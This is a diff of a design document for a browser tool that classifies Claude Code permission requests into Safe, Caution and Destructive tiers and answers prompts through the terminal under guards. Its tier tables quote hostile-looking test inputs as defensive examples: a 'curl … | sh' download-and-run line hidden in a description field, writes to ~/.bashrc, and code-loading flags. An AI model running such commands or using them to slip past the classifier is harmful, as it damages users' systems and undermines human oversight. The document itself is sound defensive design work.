 | `cargo test && git push --force origin ui/inventory` | Destructive | highest segment wins; no rule candidate (compound) |
-| `npm test \| tee out.log` | Safe | `tee` target inside the repo |
+| `npm test \| tee out.log` | Caution | as built: `tee` is not in `PLAIN_COMMANDS` (D-87); designed Safe |
 | `npm test > /tmp/out.log` | Caution | redirect outside the repo |
 | `cd /tmp && rm -rf build` | Destructive | `rm` |
 | `find . -name '*.orig' -exec rm {} ;` | Destructive | `-exec` classifies `rm` |
@@ -344,7 +375,8 @@ The commands quoted in the tier design-oversight review, with the tiers the adop
 | `git diff --output=/home/you/.bashrc` | Destructive | output option to a persistence location (F1, D-82) |
 | `git diff --output=/tmp/x.diff` | Caution | output option outside the repo (F1) |
 | `git grep -Ovim foo` | Caution | `-O` runs a program (F1) |
-| `git --no-pager log`, `git -C . status` | Safe | allowed global options (F1) |
+| `git --no-pager log` | Safe | allowed global option (F1) |
+| `git -C . status` | Caution | as built: `-C` changes the repository a command acts on, so it is not plain (D-87); designed Safe |
 | `git -C /tmp status`, `git --git-dir=/tmp/x status` | Caution | other global options (F1) |
 | `sort -o /home/you/.bashrc /dev/null`, `uniq /dev/null /home/you/.bashrc` | Destructive | output target in a persistence location (F2, D-82) |
 | `sort -o /tmp/out in.txt` | Caution | output target outside the repo (F2) |
@@ -355,12 +387,12 @@ The commands quoted in the tier design-oversight review, with the tiers the adop
 | `fd . -x wc -l` | Caution | payload with a Caution floor (F2) |
 | `fd -e orig -x rm` | Destructive | payload `rm` (F2) |
 | `find . -fprint /home/you/.bashrc` | Destructive | output option to a persistence location (F2, D-82) |
-| `node --test` | Safe | rule candidate `Bash(node --test:*)` with `ruleNote: 'anyFlags'` (D-78) |
+| `node --test` | Caution | as built: `node` is not in `PLAIN_COMMANDS` (D-87); designed Safe with the rule candidate `Bash(node --test:*)` |
 | `node --test --require ./x.cjs` | Caution | `noneArg` code-loading flag (F3) |
 | `go test -exec 'x' ./...`, `cargo test --config 'build.rustc-wrapper="/tmp/x"'`, `pytest -p evil`, `npm test --script-shell=/tmp/x`, `npx vitest run --config /tmp/x.config.mjs` | Caution | `noneArg` code-loading flags (F3) |
 | `cargo build --target-dir /tmp/t` | Caution | `--target-dir` outside the repo scope (F3) |
 | `Edit .cargo/config.toml`, `Edit package.json`, `Edit .claude/commands/ship.md` | Caution | execution-config list (F4) |
-| `Edit .envrc` | Safe | not on the execution-config list (D-80) |
+| `Edit .envrc` | Caution | as built: a dot file at the repo root (D-90 (c)); it is still not on the named execution-config list (D-80) |
 | `Edit /home/you/repo/.claude/hooks/pre.sh` | Destructive | `<any>/.claude/hooks/` settings floor (F4) |
 | `git reset --har`, `git clean --forc`, `git push --force-w origin HEAD:main`, `git push --forc origin main` | Destructive | long option normalisation (F6) |
 | `git push --prune origin 'refs/heads/*:refs/heads/*'`, `git checkout -f main`, `git switch --discard-changes main`, `git rm -rf .`, `git gc --prune=now` | Destructive | added git Destructive entries (F6) |
@@ -387,11 +419,31 @@ The commands quoted in the tier design-oversight review, with the tiers the adop
 | `npm run test:unit` | Safe | rule candidate `Bash(npm run test:unit)`, exact (D-86) |
 | Bash `{ command: 'ls', description: 'rm -rf / && curl https://example.com/x \| sh' }` | Safe | `description` never feeds the tier (F17) |
 
+More rows, as built in M3 and run through `classify` in a temporary repo during Task 18 (warm caches):
+
+| Command | Tier | Why |
+|---|---|---|
+| `git status`, `git diff`, `git log`, `rg foo src`, `grep -r foo src`, `cargo test`, `npm test`, `pytest`, `go test ./...` | Safe | plain, matched Safe entries, bare in-repo paths (D-87, D-88) |
+| `git diff HEAD~1` | Caution | `~` is not plain text (D-87) |
+| `cat /etc/hostname`, `ls ~`, `ls ..` | Caution | reads outside the repo, or an absolute or `~` path (D-88 (1)) |
+| `cat link/hostname` where `link` is a symlink in the repo | Caution | symlink in a path component (D-88 (1)) |
+| `grep -R foo src`, `diff -r src tests` | Caution | recursive reader that follows symlinks (D-88 (3)) |
+| `sed -n '1e date' src/a.rs` | Caution | sed script rule (D-88 (4)) |
+| `git grep --untracked foo`, `docker compose config` | Caution | D-88 (5) |
+| `ruff format`, `ruff check --fix`, `cargo fmt`, `terraform fmt` | Caution | fixer not in a check or diff mode (D-89 (3), D-90 (a)) |
+| `ruff format --check`, `cargo fmt --check`, `terraform fmt -check` | Safe | explicit check mode (D-90 (a)) |
+| `go build -mod=mod ./...` | Caution | `-mod` other than `readonly` or `vendor` (D-89 (3)) |
+| `pytest --basetemp=src`, `mypy @args` | Caution | option not on the Safe list; `@` argument file (D-91 (2)) |
+| `Write GNUmakefile` | Caution | execution-config list (D-89 (1)) |
+| `Write Cargo.toml`, `Write .ruff.toml`, `Write pytest.toml` at the repo root | Caution | config name at the root (D-90 (c)) |
+| `Write tests/pytest.toml`, `Write docs/notes.md` | Safe | not at the root nor in a dot directory; nested tool configs are the D-91 residual |
+| `npm run test:unit` | Safe | rule candidate `Bash(npm run test:unit)`, exact (D-86) |
+
 ## 5. Answering
 
 ### 5.1 Delivery (Decided: keystrokes into the PTY)
 
-Answers are the option keys Claude Code prints, written into the session's PTY by deckd with `source=browser`. The full sequence is [03-architecture.md](03-architecture.md) section 4.3, and the guards, proof and `did_not_land` handling are state-machines 2.6. In short, before any key is written:
+Answers are the option keys Claude Code prints, written into the session's PTY by deckd with `source=browser` (as built in M3: `source: { kind: 'deck' }`, which the shared input machine counts as browser, state-machines 3.2 `I.DeckKeys`). The full sequence is [03-architecture.md](03-architecture.md) section 4.3, and the guards, proof and `did_not_land` handling are state-machines 2.6. In short, before any key is written:
 
 1. Tier rules hold (section 2; Destructive needs `confirm: true`, never in a batch).
 2. `screenMatch = on_screen`: the prompt deckd's screen model shows right now is this request's prompt (same tool line, command text equal up to the screen's truncation point). This is the check that stops a "1" meant for a Safe prompt from approving a Destructive prompt that replaced it. When the visible prompt matches more than one open request of the session (two commands that share the visible prefix), the answer is refused, because the deck cannot tell which prompt the key would answer (F12).
@@ -405,8 +457,9 @@ Note on the typing guard: as in state-machines 2.6 and [03-architecture.md](03-a
 Proposed additions for the moment of sending:
 
 - The guards are evaluated inside deckd's write path for that PTY, against the screen snapshot deckd holds at that instant, not against a snapshot the web server fetched earlier. The web server sends `{ ptyId, keys, expectPrompt: { tool, commandPrefix, optionLabel } }`; deckd refuses the write if the screen no longer matches (`E_PROMPT_CHANGED`).
+  - **As built in M3: the guarded write.** deckd carries no prompt parser ([05-api.md](05-api.md) section 5.4), so `expectPrompt` and `E_PROMPT_CHANGED` were not built. The server parses the screen, matches the prompt to the request (`screenMatch`, including the F12 refusal when the visible prompt matches more than one open request), and sends a deckd `write` with `source: { kind: 'deck' }` and `guard: { rev, quietMs: 1000 }`, where `rev` is the screen revision it parsed. deckd writes the keys only when its screen model is still at `rev` with no output left unparsed (else `screen_changed`) and when no input from the `fm claude` terminal or the browser reached that PTY in the last `quietMs` milliseconds (else `typing_in_terminal`, D-84). On `screen_changed` the server reads the screen again and matches once more, else the answer is `not_on_screen`. A deckd that does not announce the `guardedWrite` feature in `hello` is never sent an answer (`deckd_outdated`). The tier rules are checked again on the tier the request has right before the write, since it can rise during the screen read.
 - The option digit is taken from the parsed screen options, never assumed. If "1" on screen is not a "Yes" option, the send is refused and the UI falls back to "Answer in the terminal" (Focus: "never guess").
-- Deny sends the digit of the option whose parsed label starts with "No" , not a full-label match: the captured 2.1.282 Edit prompt's deny option is "3. No", not "No, tell Claude what to do" (F17). The optional "Tell Claude what to do instead" text (state-machines 2.5) is sent as a bracketed paste followed by Enter, only after the deny is verified.
+- Deny sends the digit of the option whose parsed label starts with "No", not a full-label match: the captured 2.1.282 Edit prompt's deny option is "3. No", not "No, tell Claude what to do" (F17). The optional "Tell Claude what to do instead" text (state-machines 2.5) is sent as a bracketed paste followed by Enter, only after the deny is verified.
 
 ### 5.2 Observed sessions (Decided)
 
@@ -428,15 +481,18 @@ Pasted text is sanitized before it is written (Proposed): the bracketed-paste en
 
 Decided: only Safe requests; "Allow both Safe once" and `Alt Shift A`. Proposed mechanics (state-machines 2.5): parallel across sessions, sequential within one session, each request with its own guards and verification; the server re-classifies every id at send time and drops any that is no longer Safe from the batch, reporting it as "skipped: now Caution". Result toast "Allowed 2 of 2" or "Allowed 1 of 2: 1 did not land".
 
+As built in M3: the per-id result of a skipped id is `skipped_not_safe`. An id whose prompt is not on screen yet, because the session shows one prompt at a time, is tried again until the 3 s verify timeout passes. The drawer's batch list leaves out rows in flight, rows that did not land and rows with no parsed options, but it does not leave out a `queued` row; the server's retry covers that case.
+
 ## 6. Rule suggestion (Decided threshold and copy, Proposed mechanics)
 
 - Offered after the same Safe command is approved 5 times in the same repo (Decided). Settings offers "5 times", "3 times", "Never suggest" (Decided; SET-O4 confirms the options).
-- "The same command" means the same **rule candidate**, not the same argv: `cargo test combat::` and `cargo test --release` both count toward `Bash(cargo test:*)`, because that is exactly what the rule would allow (Proposed).
+- "The same command" means the same **rule candidate**, not the same argv: `cargo test combat::` and `cargo test --release` both count toward `Bash(cargo test:*)`, because that is exactly what the rule would allow (Proposed). As built in M3 no Bash prefix rule is suggested (D-102, D-103), so the only counted candidates are the exact `npm run` and `pnpm run` script rules and the read-only vault tools (4.3); `cargo test` gets no suggestion.
 - A request counts only when it was allowed (browser or terminal, D-73), its tier was Safe at answer time, it was a single simple command (no `&&`, `|`, `;`, subshell, wrapper options, payload, redirect outside the repo), and its matched entry has a `rule`. Otherwise it has no rule candidate and never counts: a Safe request that matches no tiers.json entry gets no suggestion (D-74).
 - A terminal approval counts only when its `PermissionRequest` and its closing `PostToolUse` came from the same Claude process, so a forged hook envelope cannot raise the counter on its own (F16).
 - npm and pnpm script entries suggest only the exact rule for the script that was approved (`Bash(npm run test)`, `Bash(npm run test:unit)`), never a prefix rule, until the pinned real-Claude check confirms how a prefix rule treats the word boundary (D-86, section 13). Each script name counts on its own.
 - Copy (Decided, canvas): drawer "You allowed cargo test in rustot 5 times. Make it a rule?"; card "Allowed 5 times. Always allow in rustot?"; toast "Rule added to rustot: Bash(cargo test:*)" with "Undo".
-- Runner rules (D-78): the Safe runner entries carry a `noneArg` list of code-loading flags, but a Claude Code prefix rule cannot, so the rule allows the command with any flags. For an entry with `ruleNote: 'anyFlags'` the suggestion adds one line: drawer "It will allow {command} with any flags." ([screens/needs-you-drawer.md](screens/needs-you-drawer.md)), card "Any flags." ([screens/home.md](screens/home.md)).
+- Runner rules (D-78, superseded for every shipped entry by D-102): the Safe runner entries carry a `noneArg` list of code-loading flags, but a Claude Code prefix rule cannot, so the rule allows the command with any flags. For an entry with `ruleNote: 'anyFlags'` the suggestion adds one line: drawer "It will allow {command} with any flags." ([screens/needs-you-drawer.md](screens/needs-you-drawer.md)), card "Any flags." ([screens/home.md](screens/home.md)).
+- Allow always (Claude Code's option 2) is offered only when the parsed option 2 label is exactly "Yes, and don't ask again for <pattern>", the wording of the captured 2.1.285 WebFetch frame, and the pattern equals the deck's rule candidate (D-77, D-95). The 2.1.285 recapture had an `ask` rule for Bash, so its Bash prompts show only "1. Yes" and "2. No", and the Bash option 2 wording is not verified against a real frame: check it on the first real Bash prompt in dogfood. Since the only Bash candidates are exact script rules, an option 2 that says `npm run test:*` never equals the candidate `Bash(npm run test)`, so option 2 is not offered for npm scripts (D-103).
 - Dismissing resets the counter; the suggestion comes back after another threshold of approvals (state-machines 2.8, Proposed).
 - Counters live in the deck database per `(repoId, pattern)`; they reset when the rule is revoked.
 
@@ -448,6 +504,7 @@ Decided: rules live in each repo's `.claude/settings.local.json` under `permissi
 
 - Bash rules use the prefix form of the pinned Claude Code version: the canvas shows `Bash(cargo test:*)`; newer documentation shows `Bash(cargo test *)`. The writer emits the documented form for the pinned version; the reader treats both as the same rule for display, duplicate detection and revoke matching (Revoke still removes the exact string found in the file).
 - Other examples: `WebFetch(domain:docs.nestjs.com)` (canvas), `mcp__vault__vault_search`.
+- As built in M3 (D-97): the writer writes the pattern it is given, and the deck's own candidates are exact (`Bash(npm run test)`), so no prefix form is ever written by the deck. The reader treats `:*` and ` *` as the same rule. Which form a real 2.1.285 session writes for option 2 is not verified: the recapture's Bash option 2 step was skipped, so no `option2-rule.json` exists.
 - The pinned-version test suite includes a check that a Bash prefix rule does not approve the same prefix chained with another command (`cargo test && rm -rf x`). Claude Code documents this behaviour; the deck never relies on it without the test, and never generates a rule from a compound command anyway.
 
 ### 7.2 Safe merge procedure
@@ -470,6 +527,7 @@ Settings "Add a rule…" ([screens/settings.md](screens/settings.md)). The patte
 
 - A Bash pattern is refused when its prefix could reach a Destructive entry: `Bash(rm:*)`, `Bash(git push:*)` (it would allow `git push --force`), `Bash(git:*)`, `Bash(docker compose:*)`, `Bash(terraform:*)`. Also refused: a bare `Bash`, `Bash(*)`, and any pattern that names the deck's controls or Claude Code settings. Refusal copy (Decided): "Destructive commands can never become rules."
 - Also refused with the same copy (F13, D-76): any Bash prefix whose command word is a wrapper, shell, interpreter or runner, because it reaches every Destructive command or floor through its payload or its options. That is the 3.3 wrapper, runner wrapper and payload wrapper lists, the 3.3 interpreter list, `make`, `just`, `sed`, `awk`, `find`, `xargs` and `git -c` (`Bash(env:*)`, `Bash(xargs:*)`, `Bash(timeout:*)`, `Bash(uv run:*)`, `Bash(npx:*)`, `Bash(bash:*)`, `Bash(python:*)`, `Bash(make:*)`, `Bash(sed:*)`); and the tool-wide `Edit`, `Write`, `MultiEdit` and `NotebookEdit` rules, which would also cover `.claude/settings.local.json` itself.
+- As built in M3 (D-100, superseded by D-101; D-103): any Bash prefix pattern (`:*` or ` *`) is refused with `destructive_rule`, because D-101 accepts a prefix only when it equals the `rule` of a Safe tiers entry and D-103 left no entry with a Bash prefix rule. An npm or pnpm script prefix (`Bash(npm run test:*)`) is refused with `invalid_pattern`, "Script rules name one script exactly.". Exact Bash rules keep the checks above: `Bash(git status)` and `Bash(npm run test)` are accepted as Safe, and an exact rule that classifies Caution is accepted as Caution (`Bash(npm run test --script-shell=/tmp/e)`, as a run of `validatePattern` in this task showed). The D-99 `readsAnyFile` warning has no remaining path since D-102 and was dropped; the only warning is `toolWide`. The refusal also covers any pattern whose command reaches a Destructive entry, a floor probe, or the deck's controls (`reachesDestructive`, `floorProbes` in `rules.mjs`).
 - Caution patterns are accepted (Decided: "only if you add it by hand") with the tier badge shown on the row.
 - A tool-wide rule without a specifier for a tool other than the file tools above (`WebFetch`) is accepted with an inline warning "Allows every {tool} call in {repo}" (Proposed).
 
@@ -486,7 +544,7 @@ Label templates (Decided by D-72, DRW-O1): Destructive tiers.json entries carry 
 | Entry | Template | Count source | Fallback when the count is unknown |
 |---|---|---|---|
 | `git push` force forms | "I checked the {n} commits that will be overwritten" | `push_overwritten`: `git rev-list --count <local>..<remote-tracking ref>` from the last fetch (may be stale; the row says "as of last fetch") | "I checked what this command will change" (D-72) |
-| `git reset --hard`, `git checkout -- .`, `git restore` | "I checked the {n} changed files that will be reset" | `reset_files`: `git status --porcelain` | "I checked what this command will change" (D-72) |
+| `git reset --hard`, `git checkout -- .`, `git restore` | "I checked the {n} changed files that will be reset" | `reset_files`: as built, the tracked paths whose index entry differs from HEAD plus those whose work-tree file differs from its index entry, computed in the server from `git ls-tree`, `git ls-files --stage` and the work tree; untracked files are not counted and `git status` is never run, because it can pass files through a repository's `filter.<name>.clean` command | "I checked what this command will change" (D-72) |
 | `git clean -f` | "I checked the {n} untracked files that will be deleted" | `clean_files`: `git clean -n` with the same flags | "I checked what this command will change" (D-72) |
 | `rm` | "I checked the {n} paths that will be deleted" | `rm_paths`: literal arguments (no glob expansion) | "I checked what this command will change" (D-72) |
 | SQL writes | "I checked which database this runs against" | none | same |
@@ -560,7 +618,8 @@ The corpus did not exist when the review ran, so every command it quotes is a co
 - Property test: for random compounds of corpus commands, the tier equals the maximum of the parts.
 - Settings writer: round-trip fixtures (missing file, empty object, existing deny/ask/hooks keys, wrong types, invalid JSON, symlinked file, symlinked `.claude`, concurrent write) assert every other key is byte-identical after write and revoke.
 - Pinned Claude Code tests: rule syntax accepted, chained command not approved by a prefix rule, option 2 writes to the same file, and whether `Bash(npm run test:*)` also allows `npm run test-and-publish` (F16; until it runs, script rules are exact names, D-86).
-- Fixtures: one owner-authorized recapture of Claude Code 2.1.282 in a prompting permission mode gives `PermissionRequest` payloads and prompt screens for Bash, Edit, Write and WebFetch, redacted by `hub/test/capture/capture-cc.mjs` before commit (D-83, F17).
+- Fixtures: one owner-authorized recapture of Claude Code 2.1.282 in a prompting permission mode gives `PermissionRequest` payloads and prompt screens for Bash, Edit, Write and WebFetch, redacted by `hub/test/capture/capture-cc.mjs` before commit (D-83, F17). As built: the installed Claude Code was 2.1.285, so the one authorized capture recorded a 2.1.285 set (Task 19, 2026-10-02) and the pin moved to 2.1.285; the 2.1.282 set stays as the earlier regression set ([09-testing.md](09-testing.md) section 5.2).
+- As built in M3: `hub/test/fixtures/tiers/cases.jsonl` is the corpus, run by `hub/test/unit/tiers-corpus.test.mjs` in the hub suite. The pinned real-Claude rule checks above are owner-pending ([m3-exit.md](m3-exit.md)).
 - Delivery tests with the fake `claude` binary: prompt swapped between render and send, typing collision, lost keys ([09-testing.md](09-testing.md)).
 
 ## Open items
@@ -572,12 +631,12 @@ The corpus did not exist when the review ran, so every command it quotes is a co
 | APR-O3 | Are `git add` and `git commit` (no `--amend`, no `--no-verify`) Safe? | **Decided** 2026-10-02 (D-76). Safe, no rule candidate, except the F14 cases: `git add -f`/`--force` and a pathspec on the sensitive list are Caution, and `git commit -n` is Caution | M3 (decided) |
 | APR-O4 | Is piping network content into an interpreter (`curl ... \| sh`) Destructive or Caution? | **Decided** 2026-10-02 (D-75, D-79). Destructive, widened by F7 to any route from a network fetch to an interpreter (3.4) | M3 (decided) |
 | APR-O5 | tiers.json as a layer over shipped defaults with non-disablable floor entries, instead of a full copy the user owns | Layered, floors fixed | M1 |
-| APR-O6 | Key sequences for AskUserQuestion with several questions or multi-select options | "Answer in the terminal" for those prompts | M3 |
-| APR-O7 | Does a running Claude Code session pick up an added or revoked rule without restart? | Assume not; toast says so | M3 |
-| APR-O8 | Audit retention: rule events forever, request events 30 days | As stated | M3 |
+| APR-O6 | Key sequences for AskUserQuestion with several questions or multi-select options | "Answer in the terminal" for those prompts; shipped that way in M3 (`options_unreadable`) | M3 before exit (owner) |
+| APR-O7 | Does a running Claude Code session pick up an added or revoked rule without restart? | Assume not; toast says so; shipped that way in M3 | M3 before exit (owner) |
+| APR-O8 | Audit retention: rule events forever, request events 30 days | As stated; shipped in M3, with `tiers_loaded` and `tiers_rejected` rows kept like rule events | M3 before exit (owner) |
 | SM-O9 | Caution from a popup ([state-machines](interaction/state-machines.md) section 13) | **Decided** 2026-10-02 (D-71). No, "Open" only | M3 (decided) |
 | SM-O10 | Terminal approvals count toward rule suggestions | **Decided** 2026-10-02 (D-73). Yes, when the `PermissionRequest` and `PostToolUse` came from the same Claude process (F16) | M3 (decided) |
 | SM-O11 | Pattern for a Safe request with no entry | **Decided** 2026-10-02 (D-74). No suggestion | M3 (decided) |
-| SET-O4 | Threshold options 5 / 3 / Never and re-offer after dismissal ([screens/settings.md](screens/settings.md)) | As designed | M3 |
+| SET-O4 | Threshold options 5 / 3 / Never and re-offer after dismissal ([screens/settings.md](screens/settings.md)) | As designed; shipped that way in M3 | M3 before exit (owner) |
 | DRW-O1 | Source of counts in the Destructive checkbox label ([screens/needs-you-drawer.md](screens/needs-you-drawer.md)) | **Decided** 2026-10-02 (D-72). Templates in section 8; fallback "I checked what this command will change" | M3 (decided) |
-| DRW-O2 | Per-pattern description line | `description` field in tiers.json | M3 |
+| DRW-O2 | Per-pattern description line | `description` field in tiers.json; shipped in M3, shown from the classifier's headline reason | M3 before exit (owner) |
